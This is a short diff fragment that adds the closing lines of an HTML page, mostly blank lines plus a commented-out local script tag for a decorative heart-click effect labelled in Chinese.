+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <!--<script type="text/javascript" src="/js/src/love.js"></script>-->
+</body>
+</html>
